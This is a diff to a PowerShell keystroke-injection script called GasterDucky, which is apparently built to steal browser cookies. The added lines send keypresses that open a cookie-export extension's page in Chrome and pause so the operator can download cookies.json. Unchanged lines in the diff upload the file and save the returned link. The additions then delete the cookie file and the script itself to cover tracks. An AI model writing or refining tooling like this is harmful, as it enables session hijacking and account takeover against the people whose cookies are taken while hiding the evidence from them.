@@ -263,7 +263,7 @@ $gasterducky.SendKeys('{ENTER}')
 start-sleep -m 300
 $looptab1 = 0
 while ($looptab1 -lt 9){
-    start-sleep -m 340
+    start-sleep -m 350
     $GasterDucky.SendKeys('{TAB}')
     $looptab1++
 }
@@ -274,16 +274,21 @@ start-sleep -m 700
 $GasterDucky.SendKeys('{LEFT}')
 start-sleep -m 700
 $gasterducky.SendKeys('{ENTER}')
-start-sleep -m 1200
-$GasterDucky.SendKeys('%')
+start-sleep -m 1000
+
+$GasterDucky.SendKeys('{TAB}')
+start-sleep -m 300
+$GasterDucky.SendKeys('{ENTER}')
 start-sleep -m 700
-$GasterDucky.SendKeys('{TAB 6}')
-start-sleep -m 800
-$GasterDucky.SendKeys('{ENTER}')
-start-sleep -m 800
-$GasterDucky.SendKeys('{TAB 2}')
-start-sleep -m 800
-$GasterDucky.SendKeys('{ENTER}')
+
+
+
+$GasterDucky.SendKeys('^(t)')
+Start-Sleep -m 300
+$GasterDucky.SendKeys('chrome-extension://iphcomljdfghbkdcfndaijbokpgddeno/manager.html')
+start-sleep -m 300
+$gasterducky.SendKeys('{ENTER}')
+
 write-host "GasterDucky Paused" -ForegroundColor Yellow
 write-host "Download cookies.json and press enter to continue" -ForegroundColor Cyan
 pause
@@ -318,6 +323,7 @@ else{
         write-host "Link copied to clipboard" -ForegroundColor Green
         $result.data.file.url.full | Set-Clipboard
         $result.data.file.url.full > $HOME\Desktop\cookies_captures.txt
+        Remove-Item $HOME\Downloads\cookies.json
     }
     else{
         write-host "Upload failed" -ForegroundColor Red
@@ -334,5 +340,7 @@ else{
 
 
 # FOOTER ENDING
+write-host "Self Destruct GasterDucky.ps1"
+Remove-Item .\gasterducky.ps1
 write-host "GasterDucky Finished" -ForegroundColor Green
 # FOOTER ENDING
